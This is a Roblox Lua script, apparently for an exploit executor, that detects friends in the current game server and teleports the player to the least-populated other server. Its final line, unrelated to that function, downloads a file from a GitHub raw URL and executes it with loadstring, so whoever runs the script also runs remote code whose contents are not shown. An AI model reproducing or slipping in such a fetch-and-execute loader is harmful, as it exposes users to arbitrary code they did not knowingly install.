if not game:IsLoaded() then game.Loaded:Wait() end
repeat task.wait() until game.Players.LocalPlayer

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId
local JobId = game.JobId

local LastHop = 0

local function IsFriend(Player)
    return LocalPlayer:IsFriendsWith(Player.UserId)
end

local function TeleportToServer(ServerId)
    for i = 1, 3 do
        local Success = pcall(function()
            TeleportService:TeleportToPlaceInstance(PlaceId, ServerId, LocalPlayer)
        end)

        if Success then
            return true
        end

        task.wait(1)
    end

    return false
end

local function ServerHop()
    if tick() - LastHop < 5 then return end
    LastHop = tick()

    local Cursor = nil
    local BestServerId = nil
    local LowestPlayerCount = math.huge

    repeat
        local Url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if Cursor then
            Url = Url .. "&cursor=" .. Cursor
        end

        local Success, Response = pcall(function()
            return HttpService:GetAsync(Url)
        end)

        if not Success then break end

        local Data = HttpService:JSONDecode(Response)

        for _, Server in ipairs(Data.data) do
            if Server.id ~= JobId and Server.playing < Server.maxPlayers then
                if Server.playing < LowestPlayerCount then
                    LowestPlayerCount = Server.playing
                    BestServerId = Server.id
                end
            end
        end

        Cursor = Data.nextPageCursor
    until not Cursor

    if BestServerId then
        print("Hopping to:", BestServerId)
        TeleportToServer(BestServerId)
    else
        print("No server found, fallback teleport")
        TeleportService:Teleport(PlaceId)
    end
end

local function CheckFriends()
    for _, Player in ipairs(Players:GetPlayers()) do
        if Player ~= LocalPlayer and IsFriend(Player) then
            print("Friend detected:", Player.Name)
            return true
        end
    end
    return false
end

if CheckFriends() then
    ServerHop()
end

Players.PlayerAdded:Connect(function(Player)
    if Player ~= LocalPlayer and IsFriend(Player) then
        print("Friend joined:", Player.Name)
        ServerHop()
    end
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/getattr-HoldOn/script/refs/heads/main/z.luau'))()
